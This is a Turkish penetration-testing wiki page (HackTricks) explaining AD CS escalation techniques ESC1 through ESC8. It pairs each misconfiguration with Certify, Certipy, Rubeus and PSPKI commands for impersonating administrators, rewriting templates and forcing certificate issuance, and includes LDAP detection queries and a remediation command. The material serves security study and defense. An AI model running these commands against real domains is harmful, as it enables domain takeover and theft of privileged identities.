# AD CS Etki Alanı Yükseltmesi

{{#include ../../../banners/hacktricks-training.md}}


**Bu, yazıların yükseltme tekniği bölümlerinin bir özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Sertifika Şablonları - ESC1

### Açıklama

### Yanlış Yapılandırılmış Sertifika Şablonları - ESC1 Açıklaması

- **Enrolment hakları Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.**
- **Yönetici onayı gerekli değildir.**
- **Yetkili personelin imzaları gerekli değildir.**
- **Sertifika şablonlarındaki security descriptors aşırı izinli olup düşük ayrıcalıklı kullanıcıların enrolment hakları almasına olanak tanır.**
- **Sertifika şablonları kimlik doğrulamayı kolaylaştıran EKU'ları tanımlayacak şekilde yapılandırılmıştır:**
- Extended Key Usage (EKU) identifier'ları olarak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya EKU olmayan (SubCA) seçenekleri dahil edilmiştir.
- **İstekçilerin Certificate Signing Request (CSR) içinde bir subjectAltName ekleyebilme yeteneği şablon tarafından izin verilecek şekilde ayarlanmıştır:**
- Active Directory (AD), bir sertifikadaki subjectAltName (SAN) varsa kimlik doğrulama için SAN'ı önceliklendirir. Bu, bir CSR içinde SAN belirtilerek herhangi bir kullanıcıyı (ör. bir domain administrator) taklit etmek için sertifika talep edilebileceği anlamına gelir. Bir SAN'ın isteyici tarafından belirtilip belirtilemeyeceği, sertifika şablonunun AD objesindeki `mspki-certificate-name-flag` özelliği ile gösterilir. Bu özellik bir bitmask'tir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının varlığı, isteyici tarafından SAN belirtilmesine izin verir.

> [!CAUTION]
> Bu yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile sertifika talep etmelerine izin verir; böylece Kerberos veya SChannel aracılığıyla herhangi bir domain principal olarak kimlik doğrulaması yapılabilir.

Bu özellik bazen ürünler veya dağıtım servisleri tarafından HTTPS veya host sertifikalarının on-the-fly oluşturulmasını desteklemek için veya yanlış anlama nedeniyle etkinleştirilir.

Bu seçeneğe sahip bir sertifika oluşturmanın bir uyarı tetiklediği, var olan bir sertifika şablonu (ör. `WebServer` şablonu, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan) çoğaltılıp sonrasında bir authentication OID eklemek için değiştirildiğinde ise bu uyarının oluşmadığı belirtilmiştir.

### Kötüye Kullanım

Zayıf sertifika şablonlarını bulmak için şu komutu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Bu güvenlik açığını **bir yöneticiyi taklit etmek için kötüye kullanmak** amacıyla şunu çalıştırabilirsiniz:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Daha sonra oluşturulan **sertifikayı `.pfx`** formatına dönüştürebilir ve tekrar **Rubeus veya certipy kullanarak kimlik doğrulaması** yapabilirsiniz:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları "Certreq.exe" ve "Certutil.exe" PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest'ın yapılandırma şemasındaki sertifika şablonlarının, özellikle onay veya imza gerektirmeyen, Client Authentication veya Smart Card Logon EKU'suna sahip ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'ı etkin olanların listelenmesi aşağıdaki LDAP sorgusunu çalıştırarak yapılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Sertifika Şablonları - ESC2

### Açıklama

İkinci kötüye kullanım senaryosu birincinin bir varyasyonudur:

1. Enrollment hakları Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
2. Yönetici onayı gereksinimi devre dışı bırakılır.
3. Yetkili imzalar gereksinimi atlanır.
4. Sertifika şablonunda aşırı izin veren bir security descriptor, düşük ayrıcalıklı kullanıcılara sertifika enrollment hakları verir.
5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**

**Any Purpose EKU**, bir saldırıcının sertifikayı **any purpose** için almasına izin verir; buna **client authentication**, **server authentication**, **code signing** vb. dahildir. Bu senaryoyu sömürmek için aynı **technique used for ESC3** kullanılabilir.

**no EKUs** içeren sertifikalar, subordinate CA sertifikaları olarak hareket eder, **any purpose** için kötüye kullanılabilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Bu nedenle bir saldırgan subordinate CA sertifikasını kullanarak yeni sertifikalarda rastgele EKU veya alanlar belirleyebilir.

Ancak subordinate CA, varsayılan ayar olan **`NTAuthCertificates`** nesnesi tarafından trusted değilse, **domain authentication** için oluşturulan yeni sertifikalar çalışmayacaktır. Yine de saldırgan **herhangi bir EKU ile yeni sertifikalar** ve rastgele sertifika değerleri oluşturabilir. Bunlar potansiyel olarak çok çeşitli amaçlar için **abused** edilebilir (ör. **code signing**, **server authentication** vb.) ve SAML, AD FS veya IPSec gibi ağdaki diğer uygulamalar için önemli sonuçları olabilir.

AD Forest’ın yapılandırma şemasında bu senaryoya uyan şablonları listelemek için aşağıdaki LDAP sorgusu çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Yanlış Yapılandırılmış Enrolment Agent Şablonları - ESC3

### Açıklama

Bu senaryo birinci ve ikinci senaryoya benzer fakat **farklı bir EKU'yu** (Certificate Request Agent) ve **2 farklı şablonu** **kötüye kullanır** (dolayısıyla iki ayrı gereksinim seti vardır),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), Microsoft dokümantasyonunda **Enrollment Agent** olarak bilinir, bir principalin başka bir kullanıcı adına **enroll** olması için **sertifika** almasına izin verir.

**“enrollment agent”** böyle bir **şablona** enroll olur ve ortaya çıkan **sertifikayı diğer kullanıcı adına bir CSR'i birlikte imzalamak (co-sign)** için kullanır. Ardından **co-signed CSR'yi** CA'ya **gönderir**, “başkası adına enroll etmeye” izin veren bir **şablona** enroll olur ve CA, “diğer” kullanıcıya ait bir **sertifika** ile yanıt verir.

**Gereksinimler 1:**

- Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara enrollment hakları verilir.
- Yönetici onayı gerekliliği atlanmıştır.
- Yetkili imzalar için gereklilik yoktur.
- Sertifika şablonunun security descriptor'ı aşırı gevşektir; düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Sertifika şablonu Certificate Request Agent EKU'sunu içerir; diğer principal'ler adına diğer sertifika şablonlarının talep edilmesine olanak tanır.

**Gereksinimler 2:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Yönetici onayı atlanır.
- Şablonun şema sürümü ya 1'dir ya da 2'den büyüktür ve Certificate Request Agent EKU'sunu gerektiren bir Application Policy Issuance Requirement belirtir.
- Sertifika şablonunda tanımlı bir EKU, domain authentication'a izin verir.
- Enrollment agent'lar için kısıtlamalar CA üzerinde uygulanmamıştır.

### Kötüye Kullanım

Bu senaryoyu kötüye kullanmak için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **kullanıcılar** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.

## Zayıf Sertifika Şablonu Erişim Kontrolü - ESC4

### **Açıklama**

The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.

Should an **attacker** possess the requisite **permissions** to **alter** a **template** and **institute** any **exploitable misconfigurations** outlined in **prior sections**, privilege escalation could be facilitated.

Notable permissions applicable to certificate templates include:

- **Owner:** Nesne üzerinde örtük kontrol sağlar; herhangi bir özniteliği değiştirmeye izin verir.
- **FullControl:** Nesne üzerinde tam yetki verir; herhangi bir özniteliği değiştirme kabiliyeti içerir.
- **WriteOwner:** Nesnenin sahibini saldırganın kontrolündeki bir principal'e değiştirmeye izin verir.
- **WriteDacl:** Erişim kontrollerini ayarlamaya izin verir; bu, saldırgana FullControl verme potansiyeli taşır.
- **WriteProperty:** Herhangi bir nesne özelliğini düzenleme yetkisi verir.

### Abuse

To identify principals with edit rights on templates and other PKI objects, enumerate with Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Öncekine benzer bir privesc örneği:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının bir sertifika şablonu üzerinde yazma ayrıcalıklarına sahip olduğu durumdur. Örneğin bu, sertifika şablonunun yapılandırmasını üzerine yazmak için kötüye kullanılabilir ve şablonu ESC1'e karşı savunmasız hale getirebilir.

Yukarıdaki yolda gördüğümüz gibi, sadece `JOHNPC` bu ayrıcalıklara sahip, ancak kullanıcı `JOHN`'un `JOHNPC`'ye yeni bir `AddKeyCredentialLink` edge'i var. Bu teknik sertifikalarla ilgili olduğundan, bu saldırıyı da uyguladım; bu saldırı [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak biliniyor. İşte kurbanın NT hash'ini almak için Certipy’s `shadow auto` komutunun küçük bir önizlemesi.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** bir sertifika şablonunun yapılandırmasını tek bir komutla üzerine yazabilir. **Varsayılan olarak**, Certipy yapılandırmayı **ESC1'e karşı savunmasız hale getirecek şekilde üzerine yazar**. Ayrıca eski yapılandırmayı kaydetmek için **`-save-old` parametresini** belirtebiliriz; bu, saldırımızdan sonra yapılandırmayı **geri yüklemek** için faydalı olacaktır.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Zayıf PKI Nesne Erişim Kontrolü - ESC5

### Açıklama

Sertifika şablonları ve sertifika otoritesinin ötesinde birkaç nesneyi içeren, ACL tabanlı ilişkilerin kapsamlı ağı tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilen bu nesneler şunları kapsar:

- CA sunucusunun S4U2Self veya S4U2Proxy gibi mekanizmalarla ele geçirilebilecek AD computer object'i.
- CA sunucusunun RPC/DCOM server'ı.
- Belirli konteyner yolu içinde yer alan herhangi bir alt AD nesnesi veya konteyner: `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Bu yol, Certificate Templates container, Certification Authorities container, NTAuthCertificates object ve Enrollment Services Container gibi konteynerler ve nesneler de dahil olmak üzere çeşitli öğeleri içerir.

PKI sisteminin güvenliği, düşük ayrıcalıklı bir saldırgan bu kritik bileşenlerin herhangi birinin kontrolünü ele geçirirse tehlikeye girebilir.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) içinde ele alınan konu ayrıca Microsoft tarafından belirtildiği üzere **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerine de değinir. Bu yapılandırma, bir Certification Authority (CA) üzerinde etkinleştirildiğinde, Active Directory®'den oluşturulanlar da dahil olmak üzere **herhangi bir istek** için **subject alternative name** içine **kullanıcı tanımlı değerlerin** eklenmesine izin verir. Sonuç olarak, bu düzenleme bir **saldırganın** alan **authentication** için yapılandırılmış—özellikle standart User template gibi ayrıcalıksız kullanıcıların kayıt olabildiği—**herhangi bir template** üzerinden kayıt olmasına olanak tanır. Böylece bir sertifika elde edilerek saldırganın etki alanı yöneticisi veya etki alanı içindeki **herhangi başka aktif varlık** olarak kimlik doğrulaması yapması mümkün olabilir.

**Not**: `certreq.exe` içindeki `-attrib "SAN:"` argümanı (“Name Value Pairs” olarak anılan) aracılığıyla bir Certificate Signing Request'e (CSR) alternatif adların eklenme yöntemi, ESC1'deki SAN kötüye kullanım stratejisinden farklılık gösterir. Buradaki ayrım, hesap bilgilerinin bir uzantı yerine bir sertifika özniteliği içinde **nasıl kapsüllediği**dir.

### Kötüye Kullanım

Ayarın etkin olup olmadığını doğrulamak için kuruluşlar `certutil.exe` ile aşağıdaki komutu kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem esasen **remote registry access** kullanır, bu nedenle alternatif bir yaklaşım şöyle olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Bu yanlış yapılandırmayı tespit edip istismar edebilen [**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar şunlardır:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, kişinin **domain administrative** haklarına veya eşdeğer yetkiye sahip olduğu varsayılırsa, aşağıdaki komut herhangi bir iş istasyonundan çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızda devre dışı bırakmak için bayrak şu şekilde kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> May 2022 güvenlik güncellemelerinden sonra, yeni verilen **sertifikalar** **talep edenin `objectSid` özelliğini** içeren bir **güvenlik uzantısı** içerecektir. ESC1 için, bu SID belirtilen SAN'dan türetilir. Ancak, **ESC6** için SID, SAN değil **talep edenin `objectSid`**'ini yansıtır.\
> ESC6'yı istismar etmek için, sistemin **SAN'ı yeni güvenlik uzantısı yerine önceliklendiren** ESC10 (Weak Certificate Mappings) için savunmasız olması gerekir.

## Zafiyetli Sertifika Yetkilisi Erişim Kontrolü - ESC7

### Saldırı 1

#### Açıklama

Bir sertifika yetkilisi için erişim denetimi, CA eylemlerini yöneten bir dizi izin aracılığıyla sağlanır. Bu izinler `certsrv.msc`'yi açıp bir CA'ya sağ tıklayıp özellikleri seçerek ve ardından Security sekmesine giderek görüntülenebilir. Ek olarak, izinler PSPKI modülü kullanılarak şu gibi komutlarla sıralanabilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, sırasıyla **`ManageCA`** ve **`ManageCertificates`** haklarına karşılık gelen birincil haklar hakkında, “CA yöneticisi” ve “Sertifika Yöneticisi” rollerine ilişkin içgörüler sağlar.

#### Kötüye Kullanım

Bir sertifika otoritesinde **`ManageCA`** haklarına sahip olmak, principal'in PSPKI kullanarak uzak ayarları değiştirmesine olanak tanır. Bu, herhangi bir şablonda SAN belirtilmesine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağını açıp kapamayı içerir; bu, domain yükseltmesi açısından kritik bir unsurdur.

Bu işlemin basitleştirilmesi, PSPKI’nin **Enable-PolicyModuleFlag** cmdlet'i kullanılarak sağlanabilir; böylece doğrudan GUI etkileşimi olmadan değişiklik yapılabilir.

**`ManageCertificates`** haklarına sahip olmak, bekleyen taleplerin onaylanmasını kolaylaştırır ve böylece “CA sertifika yöneticisi onayı” güvenliğini fiilen atlatır.

Bir sertifika talep etmek, onaylamak ve indirmek için **Certify** ve **PSPKI** modüllerinin kombinasyonu kullanılabilir:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Saldırı 2

#### Açıklama

> [!WARNING]
> Önceki saldırıda **`Manage CA`** izinleri **EDITF_ATTRIBUTESUBJECTALTNAME2** bayrağını etkinleştirmek için kullanıldı ve **ESC6 attack** gerçekleştirildi, ancak CA servisi (`CertSvc`) yeniden başlatılana kadar bunun hiçbir etkisi olmayacaktır. Bir kullanıcı `Manage CA` erişim hakkına sahip olduğunda, kullanıcıya **servisi yeniden başlatma** izni de verilir. Ancak bu, kullanıcının servisi uzaktan yeniden başlatabileceği anlamına gelmez. Ayrıca, E**SC6 might not work out of the box** çoğu yamalanmış ortamda May 2022 güvenlik güncellemeleri nedeniyle çalışmayabilir.

Bu nedenle burada başka bir saldırı sunuluyor.

Önkoşullar:

- Sadece **`ManageCA` permission**
- **`Manage Certificates`** izni ( **`ManageCA`** üzerinden verilebilir)
- Sertifika şablonu **`SubCA`** **etkin** olmalıdır ( **`ManageCA`** üzerinden etkinleştirilebilir)

Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız sertifika talepleri oluşturabileceği** gerçeğine dayanır. **`SubCA`** sertifika şablonu **ESC1**'e karşı savunmasızdır, ancak şablona yalnızca **yöneticiler** kayıt olabilir. Bu nedenle bir **kullanıcı**, **`SubCA`** için kayıt talep edebilir — bu talep **reddedilecektir** — ancak daha sonra yönetici tarafından **verilecektir**.

#### Kötüye Kullanım

Kullanıcınızı yeni bir görevli olarak ekleyerek kendinize **`Manage Certificates`** erişim hakkını verebilirsiniz.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** şablonu `-enable-template` parametresi ile **CA üzerinde etkinleştirilebilir**. Varsayılan olarak, `SubCA` şablonu etkin durumdadır.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Bu saldırı için önkoşulları yerine getirdiysek, **`SubCA` şablonuna dayalı bir sertifika talep ederek** başlayabiliriz.

**Bu istek reddedilece**k, ancak özel anahtarı kaydedeceğiz ve istek kimliğini not edeceğiz.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Sahip olduğumuz **`Manage CA` ve `Manage Certificates`** ile başarısız sertifika isteğini `ca` komutu ve `-issue-request <request ID>` parametresi ile **çıkarabiliriz**.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve son olarak, `req` komutu ve `-retrieve <request ID>` parametresi ile **verilen sertifikayı alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Saldırı 3 – Manage Certificates Extension Abuse (SetExtension)

#### Açıklama

Klasik ESC7 suistimallerine (EDITF özniteliklerini etkinleştirmek veya bekleyen istekleri onaylamak) ek olarak, **Certify 2.0** Enterprise CA üzerinde yalnızca *Manage Certificates* (diğer adıyla **Certificate Manager / Officer**) rolünü gerektiren tamamen yeni bir primitive ortaya çıkardı.

`ICertAdmin::SetExtension` RPC yöntemi, *Manage Certificates* yetkisine sahip herhangi bir principal tarafından çalıştırılabilir. Bu yöntem geleneksel olarak meşru CAs tarafından **pending** isteklerdeki uzantıları güncellemek için kullanılırken, bir saldırgan onu onay bekleyen bir isteğe **varsayılan olmayan bir sertifika uzantısı eklemek** (ör. `1.1.1.1` gibi özel bir *Certificate Issuance Policy* OID'si) için kötüye kullanabilir.

Hedeflenen şablon bu uzantı için **varsayılan bir değer tanımlamadığı** için, CA istek nihayet verildiğinde saldırgan tarafından kontrol edilen değeri ÜSTÜNE yazmayacaktır. Sonuç olarak oluşan sertifika saldırgan tarafından seçilmiş bir uzantı içerir ve bu uzantı:

* Diğer savunmasız şablonların Application / Issuance Policy gereksinimlerini karşılayarak ayrıcalık yükselmesine yol açabilir.
* Sertifikanın üçüncü taraf sistemlerde beklenmeyen güven kazanmasını sağlayan ek EKU'lar veya politikalar enjekte edebilir.

Kısacası, daha önce ESC7'nin "daha az güçlü" yarısı olarak düşünülen *Manage Certificates*, artık CA yapılandırmasına dokunmadan veya daha kısıtlı olan *Manage CA* hakkını gerektirmeden tam ayrıcalık yükseltme veya uzun süreli kalıcılık için kullanılabilir.

#### Certify 2.0 ile bu primitive'in kötüye kullanımı

1. **Pending** olarak kalacak bir sertifika isteği gönderin. Bu, yönetici onayı gerektiren bir şablonla zorlanabilir:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. Yeni `manage-ca` komutunu kullanarak bekleyen isteğe özel bir uzantı ekleyin:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Eğer şablon zaten *Certificate Issuance Policies* uzantısını tanımlamıyorsa, yukarıdaki değer sertifika verildikten sonra korunacaktır.*

3. İsteği verin (rolünüzün ayrıca *Manage Certificates* onay hakları varsa) veya bir operatörün onaylamasını bekleyin. Verildikten sonra sertifikayı indirin:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Ortaya çıkan sertifika artık kötü amaçlı issuance-policy OID'sini içerir ve sonraki saldırılarda (ör. ESC13, domain escalation vb.) kullanılabilir.

> NOTE: Aynı saldırı Certipy ≥ 4.7 kullanılarak `ca` komutu ve `-set-extension` parametresiyle de gerçekleştirilebilir.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Açıklama

> [!TIP]
> AD CS yüklü ortamlarda, eğer zafiyetli bir **web enrollment endpoint** mevcutsa ve **domain computer enrollment ve client authentication**'a izin veren en az bir **certificate template** yayımlanmışsa (ör. varsayılan **`Machine`** şablonu), spooler servisi etkin olan herhangi bir bilgisayarın bir saldırgan tarafından ele geçirilmesi mümkün hale gelir!

AD CS, yöneticilerin yükleyebileceği ek sunucu rolleri aracılığıyla sunulan çeşitli **HTTP tabanlı enrollment yöntemlerini** destekler. Bu HTTP tabanlı sertifika enrollment arayüzleri **NTLM relay saldırılarına** açıktır. Bir saldırgan, ele geçirilmiş bir makineden, gelen NTLM ile kimlik doğrulaması yapan herhangi bir AD hesabının taklit edilmesini gerçekleştirebilir. Hedef hesabı taklit ederken, bu web arayüzleri saldırgan tarafından erişilerek `User` veya `Machine` sertifika şablonlarını kullanarak bir client authentication sertifikası talep edilebilir.

- **Web enrollment interface** (eski bir ASP uygulaması, `http://<caserver>/certsrv/` adresinde bulunur) varsayılan olarak yalnızca HTTP kullanır; bu da NTLM relay saldırılarına karşı koruma sağlamaz. Ayrıca Authorization HTTP başlığında yalnızca NTLM'yi açıkça kabul eder, bu da Kerberos gibi daha güvenli kimlik doğrulama yöntemlerini devre dışı bırakır.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service ve **Network Device Enrollment Service** (NDES) Authorization HTTP başlığında varsayılan olarak negotiate kimlik doğrulamasını destekler. Negotiate kimlik doğrulaması Kerberos ve **NTLM**'yi desteklediği için, bir saldırgan relay saldırıları sırasında kimlik doğrulamayı **NTLM'ye düşürebilir**. Bu web servisleri HTTPS'yi varsayılan olarak etkinleştirse de, HTTPS tek başına **NTLM relay saldırılarına karşı koruma sağlamaz**. HTTPS hizmetleri için NTLM relay saldırılarına karşı koruma yalnızca kanal bağlama (channel binding) ile birleştiğinde mümkündür. Ne yazık ki, AD CS IIS üzerinde Extended Protection for Authentication'ı etkinleştirmez; oysa kanal bağlama için bu gereklidir.

NTLM relay saldırılarıyla ilgili yaygın bir **sorun**, NTLM oturumlarının **kısa süresi** ve saldırganın **NTLM signing** gerektiren hizmetlerle etkileşime girememesidir.

Yine de, bu sınırlama, NTLM relay saldırısı kullanılarak kullanıcı için bir sertifika elde edilerek aşılabilir; çünkü oturum süresini sertifikanın geçerlilik süresi belirler ve sertifika **NTLM signing** gerektiren hizmetlerle kullanılabilir. Çalınmış bir sertifikanın nasıl kullanılacağına dair talimatlar için bakınız:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay saldırılarının bir diğer sınırlaması ise **saldırgan kontrolündeki bir makinenin kurban hesabı tarafından kimlik doğrulaması yapılması gerektiğidir**. Saldırgan ya bekleyebilir ya da bu kimlik doğrulamayı **zorlamaya** çalışabilir:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Kötüye Kullanım**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` etkin **HTTP AD CS uç noktalarını** listeler:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, kurumsal Sertifika Yetkilileri (CAs) tarafından Sertifika Kayıt Servisi (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar **Certutil.exe** aracı kullanılarak ayrıştırılıp listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
